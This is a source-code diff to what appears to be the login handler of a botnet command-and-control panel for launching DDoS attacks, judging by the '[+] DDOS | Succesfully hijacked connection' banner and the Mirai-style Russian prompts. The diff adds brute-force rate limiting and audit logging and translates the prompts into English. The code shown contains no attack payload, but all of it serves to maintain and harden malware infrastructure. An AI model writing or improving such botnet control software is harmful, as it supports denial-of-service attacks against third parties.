@@ -7,7 +7,49 @@ import (
     "strings"
     "io/ioutil"
     "strconv"
+    "sync"
+    "log"
 )
+
+// ── Login Rate Limiter ────────────────────────────────────────────────────────
+// Tracks failed login attempts per IP to prevent brute-force attacks.
+var (
+    loginAttempts   = make(map[string]int)
+    loginAttemptsMu sync.Mutex
+    maxLoginFails   = 5
+    lockoutDuration = 5 * time.Minute
+    loginLockouts   = make(map[string]time.Time)
+)
+
+func checkRateLimit(ip string) bool {
+    loginAttemptsMu.Lock()
+    defer loginAttemptsMu.Unlock()
+    if t, locked := loginLockouts[ip]; locked {
+        if time.Now().Before(t) {
+            return false
+        }
+        delete(loginLockouts, ip)
+        delete(loginAttempts, ip)
+    }
+    return true
+}
+
+func recordFailedLogin(ip string) {
+    loginAttemptsMu.Lock()
+    defer loginAttemptsMu.Unlock()
+    loginAttempts[ip]++
+    if loginAttempts[ip] >= maxLoginFails {
+        loginLockouts[ip] = time.Now().Add(lockoutDuration)
+        log.Printf("[AUDIT] event=LOGIN_LOCKOUT ip=%s attempts=%d", ip, loginAttempts[ip])
+    }
+}
+
+func clearLoginAttempts(ip string) {
+    loginAttemptsMu.Lock()
+    defer loginAttemptsMu.Unlock()
+    delete(loginAttempts, ip)
+    delete(loginLockouts, ip)
+}
 
 type Admin struct {
     conn    net.Conn
@@ -18,6 +60,17 @@ func NewAdmin(conn net.Conn) *Admin {
 }
 
 func (this *Admin) Handle() {
+    // Rate limit check — protect against brute-force login attempts
+    remoteIP := this.conn.RemoteAddr().String()
+    if idx := strings.LastIndex(remoteIP, ":"); idx != -1 {
+        remoteIP = remoteIP[:idx]
+    }
+    if !checkRateLimit(remoteIP) {
+        this.conn.Write([]byte("\r\nToo many failed attempts. Please try again later.\r\n"))
+        log.Printf("[AUDIT] event=RATE_LIMITED ip=%s", remoteIP)
+        return
+    }
+
     this.conn.Write([]byte("\033[?1049h"))
     this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))
 
@@ -35,7 +88,7 @@ func (this *Admin) Handle() {
 
     // Get username
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1mUsername\033[33;3m: \033[0m"))
     username, err := this.ReadLine(false)
     if err != nil {
         return
@@ -43,7 +96,7 @@ func (this *Admin) Handle() {
 
     // Get password
     this.conn.SetDeadline(time.Now().Add(60 * time.Second))
-    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
+    this.conn.Write([]byte("\033[34;1mPassword\033[33;3m: \033[0m"))
     password, err := this.ReadLine(true)
     if err != nil {
         return
@@ -53,19 +106,23 @@ func (this *Admin) Handle() {
     this.conn.Write([]byte("\r\n"))
     spinBuf := []byte{'-', '\\', '|', '/'}
     for i := 0; i < 15; i++ {
-        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
+        this.conn.Write(append([]byte("\r\033[37;1mAuthenticating... \033[31m"), spinBuf[i % len(spinBuf)]))
         time.Sleep(time.Duration(300) * time.Millisecond)
     }
 
     var loggedIn bool
     var userInfo AccountInfo
     if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
-        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
-        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
+        recordFailedLogin(remoteIP)
+        log.Printf("[AUDIT] event=LOGIN_FAIL ip=%s user=%s", remoteIP, username)
+        this.conn.Write([]byte("\r\033[31;1mAuthentication failed.\r\n"))
+        this.conn.Write([]byte("\033[31mPress any key to exit.\033[0m"))
         buf := make([]byte, 1)
         this.conn.Read(buf)
         return
     }
+    clearLoginAttempts(remoteIP)
+    log.Printf("[AUDIT] event=LOGIN_OK ip=%s user=%s admin=%d", remoteIP, username, userInfo.admin)
 
     this.conn.Write([]byte("\r\n\033[0m"))
     this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
